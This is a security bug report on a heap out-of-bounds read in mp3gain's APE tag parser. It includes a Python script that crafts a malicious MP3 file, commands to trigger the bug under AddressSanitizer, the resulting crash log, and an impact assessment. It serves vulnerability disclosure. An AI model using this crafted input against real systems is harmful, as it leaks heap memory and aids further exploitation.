## Bug0: Heap OOB Read in ReadMP3APETag via MP3GAIN_MINMAX APE Item with Zero Value Size

In `ReadMP3APETag()` in `apetag.c` at lines 247 and 251, when an APE item named `MP3GAIN_MINMAX` has a `vsize` of zero, the function allocates only a 1-byte value buffer via `malloc(vsize+1)` and then unconditionally calls `memcpy(tmpString, vp, 3)` and `memcpy(tmpString, vp+4, 3)` without checking that `vsize` is large enough, reading up to 7 bytes past the end of the allocated heap buffer and causing a heap-buffer-overflow.

### PoC

Craft a malicious MP3 file using the Python script below and process it with the ASAN-instrumented mp3gain binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

# Minimal fake MP3 frame header so mp3gain opens the file
# MPEG1 Layer3 128kbps 44100Hz mono, frame size = 417 bytes
mp3_frame_header = b'\xff\xfb\x90\xc0'
mp3_frame_body   = b'\x00' * (417 - 4)
mp3_data = mp3_frame_header + mp3_frame_body  # 417 bytes total

# Malicious APE item: name="MP3GAIN_MINMAX", vsize=0
# Item layout: item_value_size(4B LE) + item_flags(4B LE) + key(null-term) + value(vsize bytes)
item_value_size = 0          # vsize=0 -> malloc(1), only 1 valid byte
item_flags      = 0          # UTF-8 text item type
item_key        = b"MP3GAIN_MINMAX\x00"   # 15 bytes (14 chars + NUL)
item_value      = b""        # 0 bytes (empty value)

item = struct.pack("<II", item_value_size, item_flags) + item_key + item_value
item_bytes = len(item)       # 4 + 4 + 15 + 0 = 23 bytes

# APEv2 footer (32 bytes, footer-only, no header)
ape_version = 2000
ape_size    = item_bytes + 32  # size field = items_total + footer_size
ape_count   = 1
ape_flags   = 0x00000000    # footer-only tag

footer = (
    b"APETAGEX" +
    struct.pack("<IIII", ape_version, ape_size, ape_count, ape_flags) +
    b"\x00" * 8             # reserved
)
assert len(footer) == 32

# Assemble file: [MP3 frame] [APE item] [APE footer]
file_data = mp3_data + item + footer

with open("poc_input.mp3", "wb") as f:
    f.write(file_data)

print(f"Generated poc_input.mp3 ({len(file_data)} bytes)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/mp3gain poc_input.mp3 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000050 at pc 0x55f3ba4e0408 bp 0x7fffa0a75e40 sp 0x7fffa0a75e30
SUMMARY: AddressSanitizer: heap-buffer-overflow in ReadMP3APETag
READ of size 4 at 0x502000000050 in ReadMP3APETag
0x502000000051 is located 0 bytes to the right of 1-byte region [0x502000000050,0x502000000051) allocated by thread T0 in ReadMP3APETag (malloc(vsize+1) = malloc(1))

### Impact

An attacker who can supply a crafted MP3 file with a zero-length `MP3GAIN_MINMAX` APE item can cause `ReadMP3APETag()` to read up to 7 bytes beyond a 1-byte heap allocation, leaking adjacent heap contents that may contain pointers or other sensitive data. This out-of-bounds read is exposed to any invocation of mp3gain on an untrusted input file, requiring no special privileges or user interaction beyond opening the file. The leaked heap data could assist an attacker in defeating ASLR and serve as a building block for further exploitation when combined with a write primitive.
